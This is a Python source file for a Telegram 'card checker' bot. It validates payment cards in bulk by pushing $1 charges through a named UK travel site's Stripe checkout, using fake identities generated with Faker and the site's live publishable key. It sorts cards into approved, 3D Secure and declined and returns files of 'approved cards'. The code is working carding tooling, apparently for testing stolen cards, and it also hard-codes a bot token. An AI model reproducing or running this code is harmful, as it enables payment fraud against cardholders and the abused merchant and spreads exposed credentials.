import requests
import random
import re
import json
import os
import asyncio
import threading
from faker import Faker
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# @doedash4
# t.me/doedash4

BOT_TOKEN = "8279926139:AAEGKYw2k-wLnBr3nmYPBVzBNZv0JLpN53A"
AMOUNT = "1"  # Fixed amount - always checks for $1

fake = Faker('en_GB')

# Store running tasks per chat
active_tasks = {}

# ──────────────────────────────────────────────
# CORE CHECKING LOGIC
# ──────────────────────────────────────────────
def check_card(cc, amount=AMOUNT, session=None):
    if session is None:
        session = requests.Session()

    try:
        parts = cc.split('|')
        card_number = parts[0].strip().replace(" ", "")
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvc = parts[3].strip()
    except (IndexError, ValueError):
        return f"❌ Invalid Format | {cc}", False, None

    exp_year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year

    email = fake.email()
    firstname = fake.first_name()
    lastname = fake.last_name()
    phone = f"+1{random.randint(1000000000, 9999999999)}"

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }

    session.get("https://www.swiftflights.co.uk", headers=headers)
    session.get("https://www.swiftflights.co.uk/pay", headers=headers)

    stripe_mid = ""
    stripe_sid = ""
    for cookie in session.cookies:
        if cookie.name == "__stripe_mid":
            stripe_mid = cookie.value
        if cookie.name == "__stripe_sid":
            stripe_sid = cookie.value

    boundary1 = f"----WebKitFormBoundary{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))}"
    data1 = f"--{boundary1}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncreate-payment\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"api_key\"\r\n\r\napi_key_001\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"amount\"\r\n\r\n{amount}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n{random.randint(100,999)}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n{firstname}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\n{lastname}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"country_id\"\r\n\r\n38\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone}\r\n--{boundary1}--\r\n"

    r1 = session.post("https://www.swiftflights.co.uk/api/payments",
                      headers={
                          "accept": "*/*",
                          "content-type": f"multipart/form-data; boundary={boundary1}",
                          "origin": "https://www.swiftflights.co.uk",
                          "referer": "https://www.swiftflights.co.uk/pay",
                          "sec-ch-ua": headers["sec-ch-ua"],
                          "sec-ch-ua-mobile": "?0",
                          "sec-ch-ua-platform": '"Windows"',
                          "user-agent": headers["user-agent"]
                      },
                      data=data1,
                      allow_redirects=False)

    transaction_ref = None
    if r1.status_code == 302 and "Location" in r1.headers:
        location = r1.headers["Location"]
        match = re.search(r'transaction_ref=([A-Z0-9]+)', location)
        if match:
            transaction_ref = match.group(1)

    if not transaction_ref:
        try:
            result = r1.json()
            if result.get("data", {}).get("transaction_ref"):
                transaction_ref = result["data"]["transaction_ref"]
        except:
            pass

    if not transaction_ref:
        return f"❌ Declined | {card_number}|{exp_month}|{exp_year}|{cvc}", False, None

    session.get(f"https://www.swiftflights.co.uk/payment?transaction_ref={transaction_ref}&module=payments", headers=headers)

    boundary2 = f"----WebKitFormBoundary{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))}"
    data2 = f"--{boundary2}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncreate-intent\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"transaction_ref\"\r\n\r\n{transaction_ref}\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\npayments\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"api_key\"\r\n\r\napi_key_001\r\n--{boundary2}--\r\n"

    r2 = session.post("https://www.swiftflights.co.uk/api/payment",
                      headers={
                          "accept": "*/*",
                          "content-type": f"multipart/form-data; boundary={boundary2}",
                          "origin": "https://www.swiftflights.co.uk",
                          "referer": f"https://www.swiftflights.co.uk/payment?transaction_ref={transaction_ref}&module=payments",
                          "user-agent": headers["user-agent"]
                      },
                      data=data2)

    client_secret = None
    payment_intent_id = None
    try:
        data = r2.json()
        if data.get("status") and data.get("data"):
            client_secret = data["data"].get("client_secret")
            payment_intent_id = data["data"].get("payment_intent_id")
    except:
        pass

    if not client_secret or not payment_intent_id:
        return f"❌ Declined | {card_number}|{exp_month}|{exp_year}|{cvc}", False, None

    muid = stripe_mid if stripe_mid else f"{random.randint(1,999)}-{random.randint(1,999)}"
    sid = stripe_sid if stripe_sid else f"{random.randint(1,999)}-{random.randint(1,999)}"
    guid = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
    session_id = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"

    stripe_data = {
        "return_url": f"https://www.swiftflights.co.uk/payment/success?payment_intent={payment_intent_id}&transaction_ref={transaction_ref}&module=payments",
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_year]": exp_year_full,
        "payment_method_data[card][exp_month]": exp_month,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[billing_details][address][country]": "TR",
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/c30beb05a2; stripe-js-v3/c30beb05a2; payment-element",
        "payment_method_data[referrer]": "https://www.swiftflights.co.uk",
        "payment_method_data[time_on_page]": str(random.randint(100000, 500000)),
        "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
        "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
        "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
        "payment_method_data[client_attribution_metadata][elements_session_id]": f"elements_session_{random.randint(1,999)}",
        "payment_method_data[client_attribution_metadata][elements_session_config_id]": f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}",
        "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_51SOyrXCnzY6pmE6aSw8ZFtYrTl7Fi3eTK1GoBCW7Kw0rYcUJZBsiaFSu7JZgFbtPVQpXDKu2o92X2gztbPwdNdGr00qQ1e3114",
        "client_attribution_metadata[client_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "standard",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "client_attribution_metadata[elements_session_id]": f"elements_session_{random.randint(1,999)}",
        "client_attribution_metadata[elements_session_config_id]": f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}",
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "client_secret": client_secret
    }

    stripe_headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": headers["user-agent"]
    }

    r3 = requests.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm",
                       headers=stripe_headers,
                       data=stripe_data)

    try:
        result = r3.json()
        status_code = result.get("error", {}).get("code", "")
        decline_code = result.get("error", {}).get("decline_code", "")

        if result.get("status") == "succeeded":
            return f"✅ Approved | {card_number}|{exp_month}|{exp_year}|{cvc}", True, "approved"
        elif result.get("status") == "requires_action":
            return f"⚠️ 3D Secure | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "threed"
        elif "insufficient_funds" in str(result).lower() or decline_code == "insufficient_funds":
            return f"❌ Insufficient Funds | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "do_not_honor" in str(result).lower() or decline_code == "do_not_honor":
            return f"❌ Do Not Honor | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "stolen_card" in str(result).lower() or decline_code == "stolen_card":
            return f"❌ Stolen Card | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "lost_card" in str(result).lower() or decline_code == "lost_card":
            return f"❌ Lost Card | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "pickup_card" in str(result).lower() or decline_code == "pickup_card":
            return f"❌ Pickup Card | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "transaction_not_allowed" in str(result).lower() or decline_code == "transaction_not_allowed":
            return f"❌ Transaction Not Allowed | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        elif "generic_decline" in str(result).lower() or decline_code == "generic_decline":
            return f"❌ Generic Decline | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
        else:
            error_msg = result.get("error", {}).get("message", "Declined").strip()
            return f"❌ {error_msg} | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"
    except:
        return f"❌ Error | {card_number}|{exp_month}|{exp_year}|{cvc}", False, "declined"


# ──────────────────────────────────────────────
# TELEGRAM BOT HANDLERS
# ──────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📋 Mass Check", callback_data="help_ran"),
         InlineKeyboardButton("🔍 Single Check", callback_data="help_sh")],
        [InlineKeyboardButton("👤 Developer", url="https://t.me/doedash4")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "   💳 *CARD CHECKER BOT* v2.0\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ *Commands:*\n\n"
        "📁 `/ran` — Upload a `.txt` file to mass check cards\n"
        "   _Each line: cardnumber|month|year|cvc_\n\n"
        "🔍 `/sh cardnumber|month|year|cvc`\n"
        "   _Example: /sh 4444333322221111|12|25|123_\n\n"
        "🛑 `/cancel` — Stop any running mass check\n\n"
        "💵 *All cards checked with $1.00 automatically*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )


async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "help_ran":
        await query.edit_message_text(
            "📁 *Mass Check Guide*\n\n"
            "1️⃣ Send `/ran`\n"
            "2️⃣ Upload your `.txt` file\n"
            "3️⃣ Bot checks each card for $1\n\n"
            "📄 *File Format:*\n"
            "`4444333322221111|12|25|123`\n"
            "`5555444433332222|11|26|456`\n\n"
            "One card per line, no amount needed!\n\n"
            "Press /start to go back.",
            parse_mode="Markdown"
        )
    elif query.data == "help_sh":
        await query.edit_message_text(
            "🔍 *Single Check Guide*\n\n"
            "Usage:\n"
            "`/sh cardnumber|month|year|cvc`\n\n"
            "Example:\n"
            "`/sh 4444333322221111|12|25|123`\n\n"
            "Bot will check the card for $1\n"
            "and reply with the result.\n\n"
            "Press /start to go back.",
            parse_mode="Markdown"
        )


async def ran_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    # Check if already running
    if chat_id in active_tasks and active_tasks[chat_id].get('running'):
        await update.message.reply_text(
            "⚠️ *Mass check already running!*\n"
            "Use /cancel to stop it first.",
            parse_mode="Markdown"
        )
        return

    context.user_data['waiting_for_file'] = True
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "   📁 *MASS CHECK MODE*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send me your `.txt` file.\n\n"
        "📄 *File Format:*\n"
        "`4444333322221111|12|25|123`\n"
        "`5555444433332222|11|26|456`\n\n"
        "⚙️ Each card checked for *$1.00*\n"
        "🛑 Send /cancel to stop anytime\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )


async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    parts = text.split(None, 1)

    if len(parts) < 2:
        await update.message.reply_text(
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   ❌ *INVALID FORMAT*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Correct usage:\n"
            "`/sh 4444333322221111|12|25|123`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        return

    card = parts[1]

    msg = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   🔍 *CHECKING CARD*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"`{card}`\n\n"
        f"💵 Amount: *$1.00*\n"
        f"⏳ Status: *Processing...*",
        parse_mode="Markdown"
    )

    status_line, is_approved, result_type = check_card(card)

    # Determine emoji and color indicator
    if is_approved:
        indicator = "✅ *APPROVED*"
    elif result_type == "threed":
        indicator = "⚠️ *3D SECURE*"
    else:
        indicator = "❌ *DECLINED*"

    await msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {indicator}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 Card: `{card}`\n"
        f"💵 Amount: *$1.00*\n\n"
        f"📋 `{status_line}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if chat_id in active_tasks and active_tasks[chat_id].get('running'):
        active_tasks[chat_id]['stop'] = True
        await update.message.reply_text(
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   🛑 *STOPPING...*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Mass check will stop after current card.\n"
            "Use /ran to start a new check.",
            parse_mode="Markdown"
        )
    else:
        context.user_data['waiting_for_file'] = False
        await update.message.reply_text(
            "✅ No active mass check to cancel.",
            parse_mode="Markdown"
        )


def progress_bar(current, total, width=12):
    """Generate a text-based progress bar."""
    filled = int(current / total * width) if total > 0 else 0
    bar = "▓" * filled + "░" * (width - filled)
    pct = int(current / total * 100) if total > 0 else 0
    return f"`[{bar}]` {pct}% ({current}/{total})"


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if not context.user_data.get('waiting_for_file'):
        await update.message.reply_text(
            "❌ Send `/ran` first before uploading a file.",
            parse_mode="Markdown"
        )
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file only.")
        return

    # Download file
    file = await document.get_file()
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')

    lines = [line.strip() for line in content.split('\n') if line.strip()]
    if not lines:
        await update.message.reply_text("❌ File is empty.")
        context.user_data['waiting_for_file'] = False
        return

    total = len(lines)
    context.user_data['waiting_for_file'] = False

    # Initialize task tracking
    active_tasks[chat_id] = {
        'running': True,
        'stop': False,
        'approved': [],
        'declined': [],
        'threed': [],
        'results': []
    }

    # Send initial status with stop button
    keyboard = [[InlineKeyboardButton("🛑 STOP CHECK", callback_data="stop_mass")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_msg = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   ⚡ *MASS CHECK STARTED*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📄 File: `{document.file_name}`\n"
        f"💳 Cards: *{total}*\n"
        f"💵 Amount: *$1.00 each*\n\n"
        f"📊 {progress_bar(0, total)}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    last_update_time = 0
    approved_count = 0
    declined_count = 0
    threed_count = 0
    checked = 0

    for i, line in enumerate(lines):
        # Check for stop signal
        if active_tasks[chat_id].get('stop'):
            break

        card = line  # Each line is just the card now (no amount)
        status_line, is_approved, result_type = check_card(card)
        checked = i + 1

        if is_approved:
            approved_count += 1
            active_tasks[chat_id]['approved'].append(card)
        elif result_type == "threed":
            threed_count += 1
            active_tasks[chat_id]['threed'].append(card)
        else:
            declined_count += 1
            active_tasks[chat_id]['declined'].append(card)

        active_tasks[chat_id]['results'].append(status_line)

        # Update status message every 5 cards or at the end
        now = datetime.now().timestamp()
        if checked % 5 == 0 or checked == total or active_tasks[chat_id].get('stop'):
            try:
                # Build mini-live feed of last few results
                recent = "\n".join(active_tasks[chat_id]['results'][-3:]) if active_tasks[chat_id]['results'] else ""

                status_text = (
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"   ⚡ *MASS CHECK* {'STOPPED' if active_tasks[chat_id].get('stop') else 'RUNNING'}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 {progress_bar(checked, total)}\n\n"
                    f"✅ Approved: *{approved_count}*\n"
                    f"⚠️ 3D Secure: *{threed_count}*\n"
                    f"❌ Declined: *{declined_count}*\n\n"
                )

                if recent:
                    status_text += f"📋 *Latest:*\n{recent}\n\n"

                status_text += "━━━━━━━━━━━━━━━━━━━━━━━"

                await status_msg.edit_text(
                    status_text,
                    parse_mode="Markdown",
                    reply_markup=reply_markup
                )
            except:
                pass

        # Small delay
        await asyncio.sleep(0.3)

    # Mark as done
    active_tasks[chat_id]['running'] = False
    was_stopped = active_tasks[chat_id].get('stop')

    # Final summary with improved formatting
    summary_lines = []
    for r in active_tasks[chat_id]['results']:
        summary_lines.append(r)

    # Send final status
    stop_text = "🛑 *STOPPED*" if was_stopped else "✅ *COMPLETED*"

    await status_msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   {stop_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 {progress_bar(checked, total)}\n\n"
        f"✅ Approved: *{approved_count}*\n"
        f"⚠️ 3D Secure: *{threed_count}*\n"
        f"❌ Declined: *{declined_count}*\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

    # Send full results in batches
    if summary_lines:
        for batch_start in range(0, len(summary_lines), 20):
            batch = summary_lines[batch_start:batch_start + 20]
            batch_num = batch_start // 20 + 1
            total_batches = (len(summary_lines) + 19) // 20

            result_text = f"📊 *Results ({batch_num}/{total_batches})*\n\n" + "\n".join(batch)

            if batch_start + 20 >= len(summary_lines):
                # Last batch - include keyboard to get approved file
                keyboard = []
                if approved_count > 0:
                    keyboard.append([InlineKeyboardButton("📥 Download Approved", callback_data="get_approved")])
                if threed_count > 0:
                    keyboard.append([InlineKeyboardButton("📥 Download 3D Secure", callback_data="get_threed")])
                reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None

                await update.message.reply_text(result_text, parse_mode="Markdown", reply_markup=reply_markup)
            else:
                await update.message.reply_text(result_text, parse_mode="Markdown")

    # Send approved file automatically if there are any
    if approved_count > 0 and not was_stopped:
        approved_text = "\n".join(active_tasks[chat_id]['approved'])
        with open(f"approved_{chat_id}.txt", "w") as f:
            f.write(approved_text)
        with open(f"approved_{chat_id}.txt", "rb") as f:
            await update.message.reply_document(
                document=f,
                filename=f"approved_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                caption=f"✅ *APPROVED CARDS*\n\nApproved: {approved_count}\n3D Secure: {threed_count}\nTotal Checked: {checked}",
                parse_mode="Markdown"
            )
        os.remove(f"approved_{chat_id}.txt")

    # Cleanup
    if chat_id in active_tasks:
        del active_tasks[chat_id]

    # Final message
    if was_stopped:
        await update.message.reply_text(
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   🛑 *MASS CHECK STOPPED*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Use /ran to start a new check.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "   ✅ *MASS CHECK COMPLETE*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Total: *{total}*\n"
            f"✅ Approved: *{approved_count}*\n"
            f"⚠️ 3D Secure: *{threed_count}*\n"
            f"❌ Declined: *{declined_count}*\n\n"
            "Use /ran to check more cards.",
            parse_mode="Markdown"
        )


async def stop_button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    chat_id = update.effective_chat.id

    if chat_id in active_tasks and active_tasks[chat_id].get('running'):
        active_tasks[chat_id]['stop'] = True
        await query.edit_message_text(
            "🛑 *Stopping mass check...*\n\nPlease wait for current card to finish.",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text("❌ No active mass check to stop.")


async def download_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = update.effective_chat.id
    await query.answer()

    if query.data == "get_approved":
        if chat_id in active_tasks and active_tasks[chat_id].get('approved'):
            cards = active_tasks[chat_id]['approved']
            text = "\n".join(cards)
            with open(f"approved_{chat_id}.txt", "w") as f:
                f.write(text)
            with open(f"approved_{chat_id}.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=f"approved_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    caption=f"✅ Approved: {len(cards)} cards"
                )
            os.remove(f"approved_{chat_id}.txt")
        else:
            await query.message.reply_text("❌ No approved cards data available.")

    elif query.data == "get_threed":
        if chat_id in active_tasks and active_tasks[chat_id].get('threed'):
            cards = active_tasks[chat_id]['threed']
            text = "\n".join(cards)
            with open(f"threed_{chat_id}.txt", "w") as f:
                f.write(text)
            with open(f"threed_{chat_id}.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=f"threed_secure_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    caption=f"⚠️ 3D Secure: {len(cards)} cards"
                )
            os.remove(f"threed_{chat_id}.txt")
        else:
            await query.message.reply_text("❌ No 3D Secure cards data available.")


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_for_file'):
        await update.message.reply_text("❌ Please upload a `.txt` file, not plain text.")
    else:
        await update.message.reply_text(
            "Use /start to see available commands.",
            parse_mode="Markdown"
        )


def main():
    print("╔══════════════════════════════════════════╗")
    print("║        💳 CARD CHECKER BOT v2.0          ║")
    print("║          t.me/doedash4                   ║")
    print("╚══════════════════════════════════════════╝")
    print("\n🚀 Bot is starting...")
    print(f"📁 Checking cards with $1.00 each")
    print("🛑 Stop button enabled for mass checks\n")

    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ran", ran_command))
    app.add_handler(CommandHandler("sh", sh_command))
    app.add_handler(CommandHandler("cancel", cancel_command))

    # Callback handlers
    app.add_handler(CallbackQueryHandler(help_callback, pattern="^help_"))
    app.add_handler(CallbackQueryHandler(stop_button_callback, pattern="^stop_mass$"))
    app.add_handler(CallbackQueryHandler(download_callback, pattern="^get_"))

    # Message handlers
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("✅ Bot is running! Press Ctrl+C to stop.\n")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()